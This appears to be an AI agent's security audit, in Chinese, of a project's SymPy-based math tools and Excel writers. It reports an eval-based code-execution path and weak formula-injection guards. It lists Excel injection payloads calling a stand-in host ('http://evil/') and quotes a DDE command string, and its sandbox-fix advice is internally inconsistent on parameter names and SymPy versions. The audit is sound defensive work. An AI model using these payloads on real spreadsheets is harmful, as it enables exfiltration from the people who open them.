# A1 — 数学 / 表达式 / 方程面（full-sweep-13）

> 原分区子代理死于 429 限流，仅留骨架。本报告由**主代理自救完成**。
> 根目录：`E:\langgraph-rag`，sympy 版本 `1.14.0`（`pyproject.toml:35`），已实地核对 venv 内 sympy 源码。

---

## 0. 最重要的一条

**`math_tool.py` 的表达式解析是一个真实、可触达的 RCE，当前 `production` 分支未修复。**

`src/backend/tools/math_tool.py:149-157`：

```python
    transformations = standard_transformations + (implicit_multiplication_application,)

    def _parse(text: str) -> Any:
        # parse_expr is SymPy's safe parser: no Python eval of arbitrary code.
        return parse_expr(
            text,
            transformations=transformations,
            evaluate=True,
        )
```

注释断言"parse_expr 是 SymPy 的安全解析器：不会对任意代码做 Python eval"。**这句注释是假的**，且假得很有分量。

venv 内 sympy 1.14.0 的实际实现（`.venv/Lib/site-packages/sympy/parsing/sympy_parser.py:1043-1062`）：

```python
    if local_dict is None:
        local_dict = {}
    ...
    if global_dict is None:
        global_dict = {}
        exec('from sympy import *', global_dict)

        builtins_dict = vars(builtins)
        for name, obj in builtins_dict.items():
            if isinstance(obj, types.BuiltinFunctionType):
                global_dict[name] = obj          # ← 包含 __import__
        global_dict['max'] = Max
        global_dict['min'] = Min
```

随后 `:1081`：`rv = eval_expr(code, local_dict, global_dict)` —— 裸 `eval`。

`math_tool.py` 的 `_parse` 既不传 `local_dict` 也不传 `global_dict`，因此两者都落到 `None` 分支：**sympy 会把 `vars(builtins)` 里所有 `BuiltinFunctionType` 注入 eval 命名空间**，其中包括 `__import__`。

⚠️ **纪律说明**：本报告只做静态阅读，**没有执行任何探针**。以上结论来自 sympy 源码的静态追踪（`parse_expr` → `stringify_expr` → `eval_expr` → `eval`），而非运行验证。RCE 的**机制**是确定的；具体 payload 形态未在本轮实测。

### 记忆对照：修复不在当前分支

既有记忆记录过一个**已验证有效**的修复手法：

```python
ns = {}
exec("from sympy import *", ns)
ns["__builtins__"] = {}
parse_expr(text, ..., local_dict=ns)   # 注意参数名
```

参数名核对结果：`sympy_parser.py:1081` 是 `eval_expr(code, local_dict, global_dict)`，而 `sympy_parser.py:1050` 的形参确实叫 **`global_dict`** —— 记忆里的参数名是对的。`_ns["__builtins__"] = {}` 这一行也是必需的：sympy 只注入 `BuiltinFunctionType` 函数而**不注入** `__builtins__` 键本身，所以必须显式塞一个空字典进去，才能阻断 `__import__` 经 `globals()['__builtins__']` 逃逸。

**但这段修复在当前分支不存在。** `math_tool.py:153-157` 没有 `local_dict`、没有 `global_dict`、没有任何命名空间构造。也就是说：**这个修复要么从未合入 `production`，要么已被回退。**

---

## 1. 逐文件说明

### `math_tool.py`（266 行）
SymPy 支持的符号运算工具，工具名 `solve_math`（`:104`）。8 个操作：`derivative` / `integral` / `simplify` / `solve` / `evaluate` / `limit` / `series`（`_OPERATIONS` 元组 `:12-20`）。输入经 Pydantic `MathInput`（`:23-73`）校验，`order` 有 `ge=1, le=20` 约束（`:64-69`）。**唯一的安全相关代码就是那个未沙箱化的 `_parse`。** 所有异常都被吞成字符串返回（`:176-177`），不会抛错。

### `linalg_tool.py`（233 行）
矩阵工具，工具名 `linear_algebra`（`:70`）。8 个操作（`:12-21`）。**矩阵结构用 `ast.literal_eval` 解析（`:141`）——这是安全的**，只接受字面量。但存在第二条通道，见 §2.2。

### `number_theory_tool.py`（164 行）
数论工具，工具名 `number_theory`。7 个操作。**全部输入为 Pydantic `int` 类型**（`number: int = Field(...)` `:33-36`，`second_number: int | None` `:37-40`，`base: int` 带 `ge=2, le=36` `:41-46`），内部再 `int(number)` 强制一次（`:101`）。**零字符串解析，无 sympy 表达式通道，本文件安全。** `base` 的范围校验在 Pydantic 层做了一次，`_do_to_base` 内又做了一次（`:143-146`），是双保险。

### `statistics_tool.py`（140 行）
描述统计，工具名 `compute_statistics`。**数字来自正则提取而非 eval**（`_NUMBER_RE` `:14`，`float(token)` `:92`）——安全。上限 `_MAX_VALUES = 100_000`（`:15`）。注意 `_parse_numbers`（`:87-95`）会**静默丢弃解析失败的 token**（`except ValueError: continue`），不报错不告警。

### `excel_edit.py` / `excel_create.py`
公式注入守卫见 §4，这是本区第二个安全主题。

---

## 2. 🧮 方程 / 表达式解析面

### 2.1 `math_tool.py` 的调用点普查

`_parse` 是所有通道的唯一收口，被调用 **7 处**：

| 行号 | 调用 | 输入来源 |
|---|---|---|
| `:163` | `_parse(raw_expr)` | `expression` 字段，无上限 |
| `:162→:207` | `_do_solve` 内 `parse(lhs_text)` | `expression` 按 `=` 切分的左半 |
| `:162→:208` | `_do_solve` 内 `parse(rhs_text)` | `expression` 按 `=` 切分的右半 |
| `:167→:196` | `parse(str(lower_bound))` | `lower_bound` 字段，无上限 |
| `:167→:197` | `parse(str(upper_bound))` | `upper_bound` 字段，无上限 |
| `:171→:227` | `parse(point_text)` | `limit` 的 `point` 字段 |
| `:173→:242` | `parse(point_text)` | `series` 的 `point` 字段 |

全部 LLM 可控，全部无长度上限，全部汇入同一个未沙箱化的 `_parse`。

`_do_solve`（`:205-215`）的行为：若表达式含 `=` 则按**第一个** `=` 切分，构造 `sympy.Eq(parse(lhs), parse(rhs))`；否则视为 `eq == 0`。`direction`（`:228`）只接受 `-`，其余一律按 `+` 处理。

`_do_evaluate`（`:248-258`）检查 `free_symbols`，非空则拒绝数值求值——这是测试 `test_agent_tools.py:587-591` 唯一验证的行为，**它验证的是"有自由符号就不能 evaluate"，与沙箱无关**。

### 2.2 `linalg_tool.py` 的第二条通道

`:157-164`：

```python
def _to_number(sympy: Any, value: Any) -> Any:
    if isinstance(value, bool):
        raise ValueError("booleans are not valid matrix entries")
    if isinstance(value, (int, float)):
        return sympy.nsimplify(value) if isinstance(value, float) else sympy.Integer(value)
    if isinstance(value, str):
        return sympy.sympify(value)      # ← 用户可控字符串 → sympify
    raise ValueError(f"unsupported entry {value!r}")
```

矩阵结构本身走 `ast.literal_eval`（`:141`，安全），**但只要某个单元格是字符串**，就进入 `sympy.sympify`。

`sympify` 自己的 docstring 就警告（`.venv/Lib/site-packages/sympy/core/sympify.py:137-139`）：

> .. warning:: Note that this function uses ``eval``, and thus shouldn't be used on unsanitized input.

且 `:188-190` 说明：sympification 对 `from sympy import *` 加载的全部内容都有访问权，未定义的名称会变成 symbol。

**这条通道无法用 `math_tool` 的同一手法修复**，因为 `sympify` 的签名（`sympify.py:124-125`）是：

```python
def sympify(a, locals=None, convert_xor=True, strict=False, rational=False, evaluate=None):
```

**没有 `global_dict` 参数**（已实地确认 sympy 1.14.0）。所以 `linalg` 必须改成直接调 `parse_expr` 并传沙箱命名空间，或者干脆拒绝字符串单元格。

**三个输入字段都通向同一条通道**：`matrix`（`:102`）、`matrix_b`（经 `_do_multiply` `:176` / `_do_add` `:188`）、`vector`（经 `_do_solve` `:197`）——三者都走 `_parse_matrix` → `_to_number` → `sympify`。

### 2.3 `number_theory_tool.py` / `statistics_tool.py`：无表达式通道

两者都不调用 `parse_expr` / `sympify`。`number_theory` 全 `int` 类型；`statistics` 用正则 + `float()`。这一对是本区做对了的。

---

## 3. 📊 公式 / 阈值清单

### 3.1 约束阈值（Pydantic 层）

| 位置 | 约束 | 说明 |
|---|---|---|
| `math_tool.py:64-69` | `order: ge=1, le=20` | series 阶数 |
| `math_tool.py:35-37` | `expression: min_length=1` | **无 max_length** |
| `linalg_tool.py:35-38` | `matrix: min_length=1` | **无 max_length** |
| `statistics_tool.py:21-27` | `numbers: min_length=1` | **无 max_length** |
| `statistics_tool.py:15` | `_MAX_VALUES = 100_000` | 解析后数量上限 |
| `number_theory_tool.py:41-46` | `base: ge=2, le=36` | 双重校验（`_do_to_base:143-146` 再查一次） |
| `excel_create.py:50-51` | `_MAX_FORMULA_CHARS = 4_000`、`_MAX_OUTPUT_VARIANTS = 100` | |

### 3.2 数值语义上的边界问题

1. **`_do_evaluate` 只挡"自由符号"，不挡"求值成本"**（`math_tool.py:257` `sympy.N(expr)`）。无 timeout、无复杂度限制。符号求值类操作（`simplify` `:169`、`solve` `:211`、`integrate` `:198`/`:201`）**全部无超时**——一个病态表达式可以挂死事件循环。整个仓库**无超时装饰器作用于这些工具**。
2. **`_do_series` 的阶数下限被无条件覆盖**（`math_tool.py:243`）：`n = max(1, int(order))`。若 `order` 传入非数字字符串会抛异常，但 Pydantic 已限制为 int，故此分支仅防御性。
3. **`_do_integral` 只判"两个边界都存在"**（`:193-195`）：只给 `lower_bound` 不给 `upper_bound` 会静默退化成**不定积分**，不报错。用户请求定积分却拿到不定积分，无任何提示。
4. **`statistics_tool.py:92-94` 静默丢弃非法 token**：`"1, 2, abc, 4"` → `[1.0, 2.0, 4.0]`，不报错。
5. **`_do_solve` 按第一个 `=` 切分**（`:206-208`）：`"2**x = 1 = 1"` 类输入会得到非预期的方程。

---

## 4. 💉 Excel 公式注入：守卫是"按语法形状"而非"按威胁建模"

### 4.1 `excel_edit.py` 的守卫（本区最完整的一处）

`excel_edit.py:184-193`（`set_formula`）：

```python
        if action == "set_formula":
            if not self.formula or not self.formula.startswith("="):
                raise ValueError("set_formula requires a formula starting with '='.")
            if _CONTROL_CHARS.search(self.formula):
                raise ValueError("formula contains unsupported control characters.")
            # '|' is the DDE-command marker (e.g. =cmd|'/c calc'!A1) and is not
            # a valid Excel formula operator, so any formula containing it is
            # rejected to block DDE execution when the file is opened in Excel.
            if "|" in self.formula:
                raise ValueError("formulas containing '|' (DDE commands) are not allowed.")
```

注释与实现**一致**（这是本仓库少数可信的注释之一），且注释准确说明了拦截动机（Excel 打开时执行 DDE）。

`excel_edit.py:177-183`（`set_cell`）：拒绝 `=` 前缀值 + 长度上限 + 控制字符。

### 4.2 三处明确缺口

**缺口 1 — `set_formula` 没有长度上限。** `set_cell` 检查 `len(self.value) > _MAX_CELL_CHARS`（`:182`），但 `set_formula`（`:184-193`）只查控制字符和 `|`。公式字符串可任意长。

**缺口 2 — `excel_create.py` 完全没有 `|` 检查。** `excel_create.py:64-73`：

```python
    @model_validator(mode="after")
    def validate_formula(self) -> SpreadsheetFormula:
        if not _CELL_PATTERN.fullmatch(self.cell):
            raise ValueError("cell must be a valid A1 address such as C4.")
        if not self.formula.startswith("=") or _CONTROL_CHARS.search(self.formula):
            raise ValueError("formula must start with '=' and contain no control characters.")
        if self.number_format and _CONTROL_CHARS.search(self.number_format):
            raise ValueError("number_format contains unsupported control characters.")
        self.cell = self.cell.upper()
        return self
```

要求 `=` 前缀 ✓、控制字符 ✓、单元格地址格式 ✓、长度上限 4000 ✓ —— **但没有 `"|" in self.formula`**。同一仓库两个 Excel 写入路径，DDE 守卫一边有一边没有。

**缺口 3 — `excel_create.validate_sheet` 接受 `=`/`|` 前缀的单元格值（⚠️ 已降级：是校验不对称，不是漏洞）。** `excel_create.py:111-116`：

```python
        for row in self.rows:
            for value in row:
                if isinstance(value, str) and (
                    len(value) > _MAX_CELL_CHARS or _CONTROL_CHARS.search(value)
                ):
                    raise ValueError("cell text is too long or contains control characters.")
```

只查长度和控制字符。对照 `excel_edit.py:177-181` 明确拒绝 `set_cell` 值以 `=` 开头——**同一个"写入单元格值"语义，两个工具行为相反**。

⚠️ **严重度修正（经 A2 分区交叉验证）**：本节初稿判断"openpyxl 会把 `=` 前缀字符串标记为公式类型，因此会变成真实公式"——**这个推断是错的**，因为 `excel_create` 走的是 Office.js 不是 openpyxl。`excel_create.mjs:64`：

```javascript
    range.values = sheetSpec.rows;                    // ← values: `=` 开头字符串落为纯文本
    for (const formula of sheetSpec.formulas || []) {
      sheet.getRange(formula.cell).formulas = [[formula.formula]];   // :67 ← 公式只走这里
```

Office.js 的 `range.values` 把以 `=` 开头的字符串当**纯文本**处理；公式只通过 `range.formulas`（`:67`）写入，而那条路径受 `SpreadsheetFormula.validate_formula`（`excel_create.py:64-73`）约束。

**所以 `validate_sheet` 接受 `=`/`|` 前缀值是校验不对称（两个写入工具同一语义规则不同），但不是可执行公式注入。** 仍需修，但优先级低于缺口 2 和 §4.3。

**顺带确认 §4.3 无法被 JS 侧兜住**：`excel_create.mjs:44-54` 的 `scanFormulaErrors` 只扫 Excel 错误字面量（`#REF!|#DIV/0!|#VALUE!|#NAME\?|#N/A|#NUM!|#NULL!`）——`HYPERLINK`/`WEBSERVICE` 是合法函数，不报错，**扫不到**。`:103`/`:114` 各扫一次（写前、导出后回读），覆盖面相同。

### 4.3 共同的、更严重的缺口：函数式注入载荷全部放行

三个工具共同放行以下载荷（均不含 `|`、不含控制字符、以 `=` 开头）：

```
=HYPERLINK("http://evil/x")
=WEBSERVICE("http://evil/?a=1")
=WEBAPI("http://evil/")
=IMPORTXML("http://evil/","XPath")
=DDE("server","topic","member")
=DDEAUTO("server","topic","member")
=TEXTWEBAPI("http://evil/")
=CSVGET("http://evil/")
=[1]Sheet1!A1                        ← 外部工作簿引用
```

`excel_edit.py:189-191` 的注释把拦截 `|` 描述成"block DDE execution"，但 `|` 只是**旧式 DDE 管道语法**。`DDE()` / `DDEAUTO()` 是函数形式，不含 `|`。而 `WEBSERVICE` / `WEBAPI` / `TEXTWEBAPI` / `CSVGET` 是近年 Excel 公式注入攻击的主力载荷。

也就是说：**守卫挡住了 2009 年之前的载荷形态，放行了所有现行载荷形态。** 这不是一个覆盖漏洞，是一个建模偏差——拦截规则来自"哪些字符不是合法的 Excel 运算符"，而不是"哪些公式会在打开时发起出站请求"。

---

## 5. 测试覆盖评估

方程面测试集中在 `tests/test_agent_tools.py:536-605`，共 8 个：

| 测试 | 行号 | 验证内容 |
|---|---|---|
| `test_math_tool_computes_derivative` | 536 | 导数 |
| `test_math_tool_computes_indefinite_integral_with_constant` | 543 | 不定积分含 `+ C` |
| `test_math_tool_computes_definite_integral` | 551 | 定积分 = 9 |
| `test_math_tool_solves_equation` | 566 | 解 `x**2-4` |
| `test_math_tool_solves_equation_with_equals_sign` | 573 | 解 `2*x+1 = 5` |
| `test_math_tool_evaluates_numeric_expression` | 580 | `sqrt(16)+2` = 6 |
| `test_math_tool_evaluate_rejects_free_symbols` | 587 | 自由符号被拒 |
| `test_math_tool_rejects_unsupported_operation` | 594 | 未知操作 |
| `test_math_tool_error_returns_string_not_raises` | 601 | 语法错误返回字符串 |

**全部是功能测试，零恶意输入测试。** 没有任何测试使用 `__import__`、`os.system`、`exec`、`doctest`、`globals()`、属性访问链等探针去探测解析沙箱。也没有任何测试验证 `math_tool` 的异常消息不会泄露内部信息。

linalg 4 个（`208-244`）、number_theory 5 个（`250-288`）、statistics 2 个（`191-206`）——同样全是功能测试。

**Excel 注入测试**：`test_excel_edit.py`（13 个）、`test_excel_create.py`（5 个）。⚠️ 后者受 `test_excel_create.py:19-25` 的 `artifact_runtime` fixture 影响，`node_modules/@oai/artifact-tool` 缺失即整文件 skip——**本机实测该依赖缺失，因此 excel_create 的守卫代码在本机一次都没真正执行过**。详见 `a0-test-suite.md` §2.1。

---

## 6. 发现汇总

| # | 发现 | 位置 | 严重度 |
|---|---|---|---|
| 1 | `parse_expr` 无 `local_dict`/`global_dict`，sympy 默认注入 `vars(builtins)`（含 `__import__`）→ 真实 RCE | `math_tool.py:149-157` | **严重** |
| 2 | 注释"parse_expr is SymPy's safe parser"与 sympy 源码 `:1050-1059` 直接矛盾 | `math_tool.py:152` | 严重（误导维护者） |
| 3 | 记忆记录的修复手法未在当前 `production` 分支 | `math_tool.py:153-157` | 严重 |
| 4 | `sympify(用户字符串)` 第二通道，且 `sympify` 无 `global_dict` 参数、无法同法修复 | `linalg_tool.py:163` | **严重** |
| 5 | 该通道由 `matrix`/`matrix_b`/`vector` 三字段共同通向 | `linalg_tool.py:102,176,188,197` | 严重 |
| 6 | 全部符号运算无超时/复杂度限制，可挂死事件循环 | `math_tool.py:169,198,201,211,244,257` | 高 |
| 7 | `set_formula` 无长度上限（`set_cell` 有） | `excel_edit.py:184-193` vs `:182` | 中 |
| 8 | `excel_create.validate_formula` 无 `\|`（DDE）检查 | `excel_create.py:64-73` | 高 |
| 9 | `excel_create.validate_sheet` 接受 `=` 前缀单元格值，与 `excel_edit.set_cell` 行为相反 | `excel_create.py:111-116` vs `excel_edit.py:177-181` | 高 |
| 10 | 三工具共同放行 `WEBSERVICE`/`WEBAPI`/`HYPERLINK`/`IMPORTXML`/`DDE()`/`DDEAUTO()` 等现行载荷 | `excel_edit.py:184-193` 等 | 高 |
| 11 | 只给 `lower_bound` 不给 `upper_bound` 静默退化为不定积分，无提示 | `math_tool.py:193-195` | 中 |
| 12 | `_parse_numbers` 静默丢弃非法 token | `statistics_tool.py:92-94` | 低 |
| 13 | 方程面 8 个测试全是功能测试，零恶意输入测试 | `test_agent_tools.py:536-605` | 高 |
| 14 | `excel_create` 守卫测试因 `artifact-tool` 缺失整文件 skip | `test_excel_create.py:19-25` | 高 |

---

## 7. 修复要点（未实施，仅供决策）

1. **`math_tool._parse`**：构造沙箱命名空间并显式传入。注意参数名是 `local_dict`（sympy 1.14.0 形参 `:1043`），且必须设 `ns["__builtins__"] = {}`——因为 sympy 只注入 `BuiltinFunctionType` 函数、**不注入** `__builtins__` 键，不设这一行 `__import__` 仍可通过 `globals()` 逃逸。已确认的手法是 `exec("from sympy import *", ns)` 后清空 builtins。
2. **`linalg_tool._to_number`**：**不能**套用上面同一手法，`sympify` 无 `global_dict` 参数（已确认 `sympify.py:124-125`）。可选：直接调 `parse_expr` 并传沙箱命名空间；或最省事——**拒绝字符串单元格**（数值矩阵不该有字符串条目，这同时也是一个正确性修复）。
3. **超时**：符号运算必须加 deadline。整个仓库无 `signal.alarm` / `asyncio.wait_for` 包裹这些调用点。
4. **Excel 守卫统一**：把 DDE + 函数式载荷拦截抽成单一校验函数，`excel_edit` 与 `excel_create` 共用；并按威胁（"会在打开时发出站请求"）而非字符形状建模。
5. **测试**：为 `math_tool` 增加恶意输入回归测试（`__import__`、`os.system`、属性链、`doctest`——`doctest('x')` 会 spawn 子进程）；把 `test_excel_create.py` 的 `artifact-tool` 依赖挪进 requirements 或把守卫测试与运行时测试拆开。

---

## 7.5 ⚠️ 修订：linalg 通道**可以**用同一手法修复

主代理版报告 §7.2 说 `linalg_tool.py:163` 无法套用 `math_tool` 的沙箱手法，因为 `sympify` 没有 `global_dict` 参数。子代理补充了一个更准确的观察：

`sympify` 的签名是 `sympify(a, locals=None, convert_xor=True, strict=False, rational=False, evaluate=None)`（`sympify.py:124-125`，两版 sympy 一致）。它**没有 `global_dict`，但有 `locals`**。因此 `linalg_tool.py:163` 很可能可以直接改成：

```python
return sympy.sympify(value, locals=_SANDBOX_NS)
```

**这意味着 §7.2 的"必须改调 parse_expr 或直接拒绝字符串单元格"结论过于保守** —— `locals=_ns` 是首选方案，"拒绝字符串单元格"仍是更简单且同时修掉一个正确性问题的备选（数值矩阵本就不该有字符串条目）。未实测，需验证 `locals=_ns` 是否真正阻断 `__import__`。

### 版本漂移（新发现）

- `pyproject.toml:35` 钉 `sympy==1.14.0`
- 子代理实测 `import sympy; sympy.__version__` → **`1.13.1`**

**声明版本 ≠ 安装版本**，与既有记忆里"config surface vs effective drift"是同一类问题。本报告 §0 引用的行号（`sympy_parser.py:1043-1062`、`sympify.py:124-125`）是**主代理实读的 1.13.1 实际文件**，与 `pyproject.toml` 声明的 1.14.0 无关。RCE 结论不受版本标签影响——两版 `parse_expr` 的 `global_dict=None` 分支行为一致。

---

## 7.6 子代理带回、主代理未独立验证的额外发现

以下由 A1 子代理报告带回，主代理本轮**未逐一复验**，标注可信度。

| # | 发现 | 位置 |
|---|---|---|
| F6 | `statistics_tool.py` 无 inf/NaN 防护：正则 `:14` 允许 `1e400` → `float` 得 `inf` → `_fmt:119-122` 先跑 `int(value)` 抛 `OverflowError`，而 `compute_statistics:51-84` **无 try/except** → 未处理异常穿透（与同文件其余工具的"错误返回字符串"约定相悖） | `statistics_tool.py:14,51-84,119-122` |
| F7 | `linalg_tool` **无任何矩阵维度上限**，`inv`/`eigenvals`/`solve`/`rank` 无超时 → CPU DoS。对照 excel/statistics/math 都有上限，唯独它没有 | `linalg_tool.py:103-125` |
| F8 | `datetime_tool.py:178` 用 `abs(delta.days)` 输出 "total N days"，但 `delta.days` 丢弃小时部分 → 对 -4 小时差值输出 `-0 day(s), 4 hour(s) (total -1 days)`，自相矛盾 | `datetime_tool.py:178` |
| F9 | `excel_file.py` **完全没有 zip-bomb 守卫**（全文无 zipfile 导入），`resolve_safe_path` 只限压缩后字节数，直接交给 `openpyxl.load_workbook:108` | `excel_file.py:108` |
| F10 | `pdf_edit.py` 无会话作用域：直接对 `file_root` 解析（`:192-197`）、输出写在源文件旁（`:435-459`），`session_root` 参数只当开关用、从不参与校验；`_reserve_output_path` 的 `while True` 无次数上限（对照 excel/word 的 `range(1,101)`） | `pdf_edit.py:192-197,435-459` |
| F11 | **zip-bomb 守卫四处口径不一**：`excel_edit.py:570-580` 允许 stored 条目（注释点名 "as the PowerPoint guard does"）；`powerpoint_edit.py:437-438` **拒绝所有** stored；`word_edit.py:1272-1277` 允许但阈值更严（512/50MB vs 1024/100MB）；`excel_file.py` 完全没有。未抽公共函数 | 四处 |
| F12 | `csv_edit.py` **零守卫**，`_validate_row:83-90` 只查列数和长度。唯一间接效果是回读校验（`_write_csv_atomically:944-946` → `_decode_csv:631-638`）挡控制字符，`=`/`|`/`\t`/`\r`/`\n` 全放行 | `csv_edit.py`（1041 行） |
| F13 | `graph/nodes/common.py:504-505` 全等分数归一化回全 0，随后按索引升序返回 → 静默退化为"原始顺序"，无日志 | `graph/nodes/common.py:504-505` |
| F14 | 余弦相似度**三处重复实现**：`web_search/semantic.py:92-102`、`rag/document_quality.py:258-266`、`graph/nodes/common.py:509-519`，`zip(strict=)` 与零向量判据都不一致 | 三处 |
| F15 | `excel_create.mjs:44-54` 的 `scanFormulaErrors` 扫 `#REF!|#NAME\?|...`，能拦 `=IMPORTXML` 这类未实现函数，但 `HYPERLINK` 合法不报错 → 扫不到。`excel_create.mjs:67` 会真正把公式写进单元格 | `excel_create.mjs` |

### 公式注入测试补充

`test_excel_edit.py:355-359` **确实有** DDE `|` 用例（主代理未读到此处，修正本报告 §5）。`test_excel_create.py` 全文无 DDE/`|` 用例，且受 `:19-25` 的 skip 影响。

### `@oai/artifact-tool` 定性未决

该依赖不在仓库内，经 `EXCEL_NODE_MODULES_PATH` 外部软链引入（`excel_create.py:318-342`）。因此"`range.values` 对 `=` 开头字符串是写公式还是写文本"**无法静态定性**，需实测一次。这直接影响 §4.2 缺口 3 的严重度判断。

---

## 8. 未读到 / 不确定

- **未执行任何 RCE 探针**。§0 的结论来自 sympy 源码静态追踪，机制确定但具体 payload 形态未实测。
- `src/backend/tools/currency.py`、`datetime_tool.py`、`powerpoint_edit.py`、`word_edit.py`、`word_file.py`、`pdf_edit.py`、`pdf_file.py` **由 A4 分区覆盖**（`a4-net-tools.md`），本报告未重读。A4 已确认 currency 无 C/F 换算、`currency.py:74` 存在同主机路径穿越。
- 未验证 langchain `StructuredTool` 层是否在 `args_schema` 之外还有额外校验（`math_tool.py:102-114`、`linalg_tool.py:68-79` 的 `from_function` 包装）。理论上 Pydantic `MathInput` 是唯一校验层，但未读 langchain 源码确认。
- `excel_edit.py` 全文（约 300 行）只读了守卫段 `:155-224`；`_CONTROL_CHARS`、`_MAX_CELL_CHARS`、`_require_cell_address`、`_require_sheet_name` 的定义与其余 action 分支未逐一核对。
